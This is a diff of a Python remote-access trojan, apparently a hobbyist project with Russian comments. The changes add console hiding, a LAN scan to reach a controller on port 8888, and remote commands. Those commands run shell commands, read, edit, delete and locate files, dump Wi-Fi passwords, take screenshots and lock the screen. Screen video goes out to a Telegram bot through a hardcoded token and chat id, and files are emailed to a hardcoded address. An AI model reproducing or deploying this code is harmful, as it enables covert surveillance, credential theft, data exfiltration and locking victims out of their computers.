@@ -1,4 +1,18 @@
-import os, time
+from os import system
+"""system("pip install datetime")
+system("pip install pynput")
+system("pip install shutil")
+system("pip install pypi-stat")
+system("pip install keyboard")
+system("pip install smtplib")
+system("pip install email")
+system("pip install emails")
+system("pip install sockets")
+system("pip install subprocess")
+system("pip install mimetypes")
+system("pip install requests")
+system("pip install pywifi")"""
+import time
 import datetime
 from pynput.keyboard import Listener
 from pynput import keyboard
@@ -10,19 +24,104 @@ from email.mime.image import MIMEImage  # Изображения
 from email.mime.multipart import MIMEMultipart  # Многокомпонентный объект
 from email.mime.text import MIMEText  # Текст/HTML
 
-
+#from tkinter import Tk, Entry, Label
+import pyautogui
 import socket, subprocess, mimetypes, requests
 from pywifi import *
 from requests import get
 
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+#s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 host = socket.getaddrinfo(socket.gethostname(), None)
 ipv4_addresses = [i[4][0] for i in host if i[0] == socket.AF_INET]
 #print(ipv4_addresses)
-ip = "192.168.0.12"
+ip = "192.168.56.1"
 reconect = False
 
 
+def h1de():
+    try:
+        import threading
+
+        def def_hide():
+            class myThread(threading.Thread):
+                def __init__(self, threadID, name, counter):
+                    threading.Thread.__init__(self)
+                    self.threadID = threadID
+                    self.name = name
+                    self.counter = counter
+
+                def run(self):
+                    main()
+
+            def hide():
+                import win32console, win32gui
+                window = win32console.GetConsoleWindow()
+                win32gui.ShowWindow(window, 0)
+                return True
+
+            # Запуск кейлогера
+            def main():
+                print()
+                """hm.KeyDown = OnKeyboardEvent
+                hm.HookKeyboard()
+                pythoncom.PumpMessages()
+        """
+
+            hide()
+            # hm = pyHook.HookManager()
+            # disallow_Multiple_Instances()
+            thread = myThread(1, "Thread", 1)
+            thread.start()
+    except:
+        pass
+
+h1de()
+
+
+def wa1ting(ip="192.168.0.12", s=None, it=0):
+    del s
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    print("\n\tTry to connect " + ip)
+    try:
+        s.connect((ip, 8888))
+    except:
+        s.close()
+        print("\t\tNot this")
+        if it > 2:
+            print("\nCrushed")
+            return None
+        it += 1
+        ip, s = wa1ting(ip=ip, s=s, it=it)
+        return [ip, s]
+    else:
+        print("\nConnected")
+        return [ip, s]
+
+def check_wifi():
+    s1 = str(socket.gethostbyname(socket.gethostname()))
+    s1 = s1.split(".")
+    s1[3] = "0"
+    s1 = ".".join(s1)
+    for i in range(1001):
+        i = 212
+        s1 = s1.split(".")
+        s1[3] = str(i)
+        s1 = ".".join(s1)
+        subprocess.getoutput("chcp 65001")
+        req = subprocess.getoutput("ping " + s1)
+        print(s1 + "\n" + req + "\n")
+        if "Destination host unreachable" in req or "Request timed out" in req:
+            pass
+        else:
+            sock, s = wa1ting(ip=s1)
+            print(s1)
+            if sock == None:
+                pass
+            else:
+                return [sock, s]
+
+ip, s = check_wifi()
+#ip = check_wifi()
 
 def scan_wifi():
     wifi = PyWiFi()
@@ -53,6 +152,8 @@ def wait(ip, data, main_data):
             wait(main_data[0], data, main_data)
     else:
         return ip
+
+
 def prepare():
     data1 = (subprocess.check_output(["ipconfig", "/all"]).decode("cp866")).split('\n')
     data = []
@@ -94,7 +195,6 @@ def waiting(ip="192.168.0.12", s=None):
         return s
     else:
         return s
-
 
 def show_ip(lp=None, public_ip=None):
     try:
@@ -193,7 +293,7 @@ def kboard(com):
     elif "hotk" in com:
         hotk(com.split("|")[1], com.split("|")[-1])
 
-def v1deo(tm, s=None, ip="192.168.0.12"):
+def v1deo(tm, s=None, ip=None):
     import pyautogui
     #screen = pyautogui.screenshot("screenshot.png")
 
@@ -224,6 +324,7 @@ def v1deo(tm, s=None, ip="192.168.0.12"):
         except KeyboardInterrupt as e:
             out.release()
             send_video(str(tm) + ".avi")
+            os.remove(str(tm) + ".avi")
             #print(str(tm) + ".avi")
             print(e)
             exit(1)
@@ -238,37 +339,39 @@ def send_video(path='output.avi'):
     global message
     global bot
     import telebot
-    bot = telebot.TeleBot('') # token
+    bot = telebot.TeleBot('5158577409:AAE9OzHkFI-rKICyZTyPgH4yZnRdIEOsH9s') # token
 
     @bot.message_handler(commands=['stp'])
     def stop_command():
         #print("ok")
         bot.stop_polling()
 
-    bot.send_video(0, video=open(path, 'rb'), supports_streaming=True)  # first parameter is your telegram id
+    bot.send_video(1251720329, video=open(path, 'rb'), supports_streaming=True)
+    #bot.send_video(0, video=open(path, 'rb'), supports_streaming=True)
     stop_command()
     #bot.polling(none_stop=False, interval=0)
+
 
 try:
     s.connect((ip, 8888))
 except:
     s.close()
     perm_dt = str(datetime.datetime.now())
-    per = perm_dt.split(" ")[-1]
-    per = "=".join(per.split(":"))
-    perm_dt = perm_dt.split(" ")
-    perm_dt[-1] = per
-    perm_dt = " ".join(perm_dt)
+    perm_dt = perm_dt.replace(":", "=")
     _ = perm_dt
-    w = v1deo(_)
+    w = v1deo(_, ip=ip)
     pathr = w[0]
     s = w[1]
     send_video(pathr)
+    os.remove(pathr)
     #s = waiting(ip, s)
 subprocess.getoutput("chcp 65001")
+s.send((subprocess.getoutput("cd")).encode("utf-8"))
+
 
 def ch_dir(dir):
     subprocess.getoutput("cd " + dir)
+
 
 def tr():
     qy = []
@@ -302,11 +405,57 @@ def cpy(path, main_path):
 def wlk(dir, main_path):
     for name in os.listdir(dir):
         path = os.path.join(dir, name)
-        if os.path.isfile(path):  # если файт, ...
+        if os.path.isfile(path):  # если файл, ...
              cpy(name, main_path) # создать функцию переноса в папку
         else:  # если папка, ...
             wlk(path, main_path)
 
+def wolk(dir, file, checked=[], flag=False):
+    try:
+        for name in os.listdir(dir):
+            path = os.path.join(dir, name)
+            if path in checked:
+                pass
+            else:
+                if os.path.isfile(path):  # если файл, ...
+                    if file in name:  # создать функцию переноса в папку
+                        flag = True
+                        checked.append(path)
+                        return [path, checked]
+                    else:
+                        checked.append(path)
+                else:  # если папка, ...
+                    if file == name:
+                        flag = True
+                        checked.append(path)
+                        return [path, checked]
+                    checked.append(path)
+                    try:
+                        pa = wolk(path, file, flag=flag)[0]
+                    except:
+                        pa = None
+                    if pa == None:
+                        #path = "\\".join(path.split("\\")[0:-1])
+                        if path in checked:
+                            path = "\\".join(path.split("\\")[0:-1])
+                            checked.append(path)
+                        else:
+                            pass
+                        #path = "\\".join(path.split("\\")[0:-1])
+                        if not flag:
+                            try:
+                                pa = wolk(path, file, flag=flag)[0]
+                            except:
+                                pa = None
+                    q = [pa, checked]
+                    return q
+    except:
+        try:
+            if pa == None:
+                pa = "No files"
+            return [pa, []]
+        except Exception as e:
+            return str(e) + "=>\n=> No files", []
 
 def py_to_exe(file):
     """with open(file + ".py", "w") as tr:
@@ -427,38 +576,153 @@ password = ""
 dest_email = "verart1@yandex.ru"
 
 
+
+"""ip_addr = []
+ip_addrs = []
+perm_ip_addrs = []
+macs = []
+perm_macs = []
+types = []
+perm_types = []
+flag = False
+your = False
+s = str(socket.socket(socket.AF_INET, socket.SOCK_STREAM))
+for line in subprocess.getoutput("arp -a"):
+    if your:
+        if "interface" in line.lower():
+            your = False
+        pass
+    elif s in line.lower():
+        your = True
+    elif "interface" in line.lower():
+        ip_addr.append(line.split(" ")[1])
+    elif "internet address" in line.lower():
+        if not flag:
+            ip_addrs.append(perm_ip_addrs)
+            macs.append(perm_macs)
+            types.append(perm_types)
+            perm_types = []
+            perm_macs = []
+            perm_ip_addrs = []
+        flag = True
+    else:
+        perm_macs.append(line.split(" ")[1])
+        ip_addrs.append(line.split(" ")[0])
+        types.append(line.split(" ")[-1])
+ip_addrs.append(perm_ip_addrs)
+macs.append(perm_macs)
+types.append(perm_types)
+del perm_ip_addrs
+del perm_types
+del perm_macs
+return ip_addr, ip_addrs, macs, types"""
+
+def find_file(path, d="max"):
+    max_flag = False
+    if d == "max":
+        max_flag = True
+        d = 0
+    elif d == "":
+        d = 3
+    else:
+        d = int(d)
+    pr = []
+    checked = []
+    pa = None
+    d1 = 0
+    while d1 < d or max_flag:
+        pa, checked = wolk(subprocess.getoutput("cd"), path, checked=[])
+        if pa == None:
+            break
+        if pa not in pr:
+            pr.append(pa)
+        d1 += 1
+    if pr == []:
+        pr = ["No files"]
+    return pr
+
+def lock(pas):
+    import pyautogui
+    from tkinter import Tk, Entry, Label
+    from pyautogui import click, moveTo
+    from time import sleep
+    root = Tk()
+    root.update()
+
+    def callback(event):
+        global k, entry
+        if entry.get() == pas:  # задаём ключ
+            k = True
+
+    def on_closing():
+        click(width / 2, height / 2)  # закликивание в центр экрана
+        moveTo(width / 2, height / 2)  # перемещение курсора в центр экрана
+        root.attributes("-fullscreen", True)  # включаем полноэкранный режим
+        root.protocol("WM_DELETE_WINDOW", on_closing)  # при попытке закрыть окно с помощью диспетчера окон вызываем функцию
+        root.update()  # постоянное обновление окна
+        root.bind('<Control-KeyPress-c>', callback)  # вводим сочетание клавиш, которые будут закрывать программу
+
+    root = Tk()  # создаём окно
+    pyautogui.FAILSAFE = False  # выключаем защиту "левого верхнего угла"
+    width = root.winfo_screenwidth()  # считываем ширину экрана и создаём окно с заданной шириной
+    height = root.winfo_screenheight()  # считываем высоту экрана и создаём окно с заданной высотой
+    root.title('From "30" with love')  # пишем как программа отобразиться в панели задач
+    root.attributes("-fullscreen", True)  # включаем полноэкранный режим
+    entry = Entry(root, font=1)  # создаём окошко ввода
+    entry.place(width=150, height=50, x=width / 2 - 75, y=height / 2 - 25)  # размеры окошка и его положение
+    label0 = Label(root, text=f"╚(•⌂•)╝ Locker by {pas} (╯°□°）╯︵ ┻━┻", font=1)  # имя открытого окна
+    label0.grid(row=0, column=0)  # положение надписи с именем
+    label1 = Label(root, text="Пиши пароль и жми Ctrl+C", font='Arial 20')  # сообщение пользователю
+    label1.place(x=width / 2 - 75 - 130, y=height / 2 - 25 - 100)  # положение сообщения
+    root.update()  # постоянное обновление окна
+    sleep(0.5)  # пауза в обновлении
+    click(width / 2, height / 2)  # закликивание в центр экрана
+    k = False  # обнуление ключа
+    while not k:  # пока не ввели верный ключ
+        on_closing()  # вызываем функцию хулиганства
+    else:
+        root.destroy()
+
 def read_file(python):
     filepath = os.path.abspath(python)
     ctype, encoding = mimetypes.guess_type(filepath)
-    maintype, subtype = ctype.split('/', 1)  # Получаем тип и подтип
-    with open(python, "r", encoding='utf-8') as file:  # снова читаем атакуемый файл
+    #maintype, subtype = ctype.split('/', 1)  # Получаем тип и подтип
+    """with open(python, "r", encoding='utf-8') as file:  # снова читаем атакуемый файл
         original_code = ""  # вводим переменную для исходного кода атакуемого файла
         for line in file:
             original_code += line  # построчно вводим код в переменную
     #print(original_code)
-        file.close()
+        file.close()"""
+    f = open(python, "r", encoding="utf-8")
+    original_code = f.read()
+    f.close()
     return original_code
 
-
-s.send((subprocess.getoutput("cd")).encode())
-print(s.recv(1024).decode())
+#print("\n" + s.recv(1024).decode("utf-8"))
+#print(s.recv(1024).decode())
 while 1:
     try:
         if not reconect:
             pass
         else:
             s.send((subprocess.getoutput("cd")).encode())
-            print(s.recv(1024).decode())
+            print(s.recv(1024).decode("utf-8"))
             reconect = False
-        command = s.recv(4096 * 1024).decode("utf-8")
-        if "py_to_exe" in command.split(":")[0]:
+        command = s.recv(1024).decode("utf-8")
+        if "py_to_exe" == command.split(":")[0]:
             try:
                 py_to_exe((command.split(":"))[-1])
             except:
                 s.send("done".encode("utf-8"))
-        elif "read" in command:
-            rf = (read_file((command.split(" "))[-1]))
-            s.send(rf.encode())
+        elif "lock" == command:
+            pas = command.split(" ")[-1]
+            lock(pas)
+        elif "read" == command.split(" ")[0]:
+            if len(command.split(" ")) == 3:
+                rf = (read_file((command.split(" "))[1]))
+            else:
+                rf = (read_file((command.split(" "))[-1]))
+            s.send(rf.encode("utf-8"))
         elif command == "show_geo":
             lp = str(socket.gethostbyname(socket.gethostname()))
             p_ip = get("http://api.ipify.org").text
@@ -467,7 +731,9 @@ while 1:
                 s.send(ip1.encode("utf-8"))
             else:
                 s.send("Is not connected".encode("utf-8"))
-        elif "ch_dir" in command.lower():
+        elif "abbort_client" == command.split(" ")[0]:
+            exit(1)
+        elif "ch_dir" == command.split(" ")[0]:
             if (command.split(" "))[-1] == "C:" or (command.split(" "))[-1] == "A:" or (command.split(" "))[-1] == "B:" or (command.split(" "))[-1] == "D:" or (command.split(" "))[-1] == "Z:":
                 os.chdir((command.split(" "))[-1])
                 s.send((subprocess.getoutput("cd")).encode())
@@ -477,55 +743,88 @@ while 1:
                 continue
             os.chdir((command.split(" "))[-1])
             s.send((subprocess.getoutput("cd")).encode())
-        elif "send_video" in command:
+        elif "send_video" == command.split(" ")[0]:
             timer = int(command.split(" ")[-1])
             _ = ti(timer, 0)
             pathr = video(_, timer)
             send_video(pathr)
-        elif "delete" in command.lower():
-            if (os.path.isfile((command.split(" "))[-1])):
+            os.remove(pathr)
+        elif "delete" == command.split(" ")[0]:
+            if os.path.isfile((command.split(" "))[-1]):
                 os.remove((command.split(" "))[-1])
             else:
-                os.chdir((command.split(" "))[-1])
                 try:
+                    os.chdir((command.split(" "))[-1])
+                except:
+                    try:
+                        os.remove((command.split(" "))[-1])
+                    except:
+                        continue
+                """try:
                     os.listdir(os.path.normpath((command.split(" "))[-1]))
                 except FileNotFoundError:
                     s.send("FileNotFoundError".encode())
-                    continue
+                    continue"""
                 for file in os.listdir("\\".join((os.path.abspath(((command.split(" "))[-1])).split("\\"))[0:-1])):
+                    os.chmod(file, stat.S_IEXEC)
                     os.remove(file)
                 os.chdir("..")
                 os.rmdir((command.split(" "))[-1])
-        elif "make_d" in command:
+        elif "make_d" == command.split(" ")[0]:
             subprocess.getoutput("md " + (command.split(" "))[-1])
             os.chdir((command.split(" "))[-1])
             s.send((subprocess.getoutput("cd")).encode())
-        elif "show_wifi_pass" in command:
-            s.send(tr().encode("utf-8"))
-        elif "kboard" in command:
+        elif "show_wifi_pass" == command:
+            guts = tr()
+            s.send(guts.encode("utf-8"))
+        elif "kboard" == command.split("#")[0]:
             kboard(command.split("#")[-1])
-        elif "edit" in command:
+        elif "edit" == command.split(" ")[0]:
             name = (command.split(" "))[-1]
             #s.send(read_file(name).encode())
-            file = open(name, "r")
+            if name not in os.listdir(subprocess.getoutput("cd")):
+                file = open(name, "w", encoding="utf-8")
+                file.write("New file")
+                file.close()
+            file = open(name, "r", encoding="utf-8")
             s.send((file.read()).encode("utf-8"))
             file.close()
             isp = s.recv(4096 * 1024).decode("utf-8")
-            with open(name, "w") as fl:
+            with open(name, "w", encoding="utf-8") as fl:
                 fl.write(isp); fl.close()
             s.send(read_file(name).encode("utf-8"))
             #s.send((or_co).encode())
         elif command == "" or command == "y" or command == "n":
             continue
-        elif "start" in command:
+        elif "find_file" == command.split(" ")[0]:
+            spl = command.split(" ")
+            path = find_file(spl[1])
+            path = "\n".join(path)
+            s.send(path.encode("utf-8"))
+        elif "start" == command.split(" ")[0]:
             os.startfile((command.split(" "))[-1])
             s.close()
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s = waiting(ip, s)
-        elif "cpy" in command:
+        elif "check_wifi" == command:
+            s.send(subprocess.getoutput("arp -a").encode("utf-8"))
+        elif "cpy_mail" == command.split(" ")[0]:
             cd = True
             file = (command.split(" "))[1]
             send_email(dest_email, file)
+        elif "send_file" == command.split(" ")[0]:
+            guts = s.recv(4096 * 1024).decode("utf-8")
+            f = open("sended_" + command.split(" ")[-1], "w", encoding="utf-8")
+            f.write(guts)
+            f.close()
+        elif "cpy" == command.split(" ")[0]:
+            rf = (read_file((command.split(" "))[-1]))
+            s.send(rf.encode())
+        elif command == "screenshot":
+            screen = pyautogui.screenshot("screenshot.png")
+            #send_email(addr_to="verart1@yandex.ru", f1le="screenshot.png")
+            del screen
+            #os.remove("screenshot.png")
         else:
             output = subprocess.getoutput(command)
             s.send(output.encode())
@@ -542,10 +841,11 @@ while 1:
             per = "=".join(per.split(":"))
             perm_dt = perm_dt.split(" ")
             perm_dt[-1] = per
-            perm_dt = " ".join(perm_dt)
+            perm_dt = "_".join(perm_dt)
             _ = perm_dt
-            pathr = v1deo(_)
+            pathr = v1deo(_, ip=ip)
             s = pathr[-1]
             send_video(pathr[0])
+            os.remove(pathr[0])
 
 s.close()
